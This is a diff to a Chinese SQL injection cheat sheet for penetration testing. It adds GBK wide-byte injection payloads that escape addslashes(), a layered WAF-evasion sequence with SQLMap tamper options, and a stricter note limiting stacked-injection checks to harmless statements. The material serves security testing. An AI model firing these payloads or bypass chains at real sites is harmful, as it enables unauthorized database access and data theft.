@@ -1,5 +1,4 @@
 # SQL 注入实战参考
-- SQLMap 自动化利用 → `tools-sqlmap.md`
 - WAF 环境下的绕过技巧 → `web-waf-bypass.md`
 
 > 分类: 检测 → Union注入 → 报错注入 → 盲注(布尔/时间) → 堆叠 → 写文件/读文件 → WAF绕过 → SQLMap
@@ -198,7 +197,7 @@ sqlmap -u "http://target.com/page.php?id=1" --level=5 --risk=3 --batch
 
 ## 5. 堆叠注入 (多语句执行)
 
-> 堆叠注入的核心验证目标是**确认多语句执行能力**，用无害语句验证即可。破坏性操作（DROP/INSERT/xp_cmdshell）在实际渗透中通过 §6 读写文件实现。
+> 堆叠注入的核心验证目标是**确认多语句执行能力**，只用无害语句验证（SELECT/延时/版本探测）。严禁任何修改或删除数据的写操作。
 
 ```sql
 # MySQL (需 PHP MySQLi multi_query / Python pymysql)
@@ -305,6 +304,21 @@ SLEEP(5) → BENCHMARK(5000000,MD5(1))
 | `@@version` | `VERSION()` |
 | `@@datadir` | `@@GLOBAL.datadir` |
 
+### 7.4 宽字节注入 (GBK 绕过转义)
+
+```sql
+# 条件: 后端用 addslashes() 转义 ' → \'，且数据库连接字符集为 GBK
+# %df 与转义符 \ (%5c) 组合成合法汉字 → 单引号逃逸
+?id=1%df' AND 1=1--+
+?id=1%df' UNION SELECT 1,user(),3--+
+# 其他首字节候选: %bf %a1 %de (取决于字符集)
+```
+
+### 7.5 仍被拦截？
+
+加载 `web-waf-bypass.md`，按 §11 分层流程逐层打: 编码(单→双) → 大小写/注释 → HPP → 分块传输 → Content-Type 切换 → 协议走私 → IP 伪造。
+SQLMap 组合: `--tamper=space2comment,randomcase,between,charencode --random-agent`。
+
 ---
 
 ## 8. 常用 SQLMap 参数
@@ -354,7 +368,6 @@ sqlmap -r request.txt --batch --level=5 --risk=3 --tamper=space2comment,randomca
 
 ---
 ## 相关参考
-- SQLMap 自动化利用 → `tools-sqlmap.md`
 - WAF 环境下的绕过技巧 → `web-waf-bypass.md`
 
 *参考: OWASP SQL Injection Cheat Sheet + WooYun 实战案例整理*
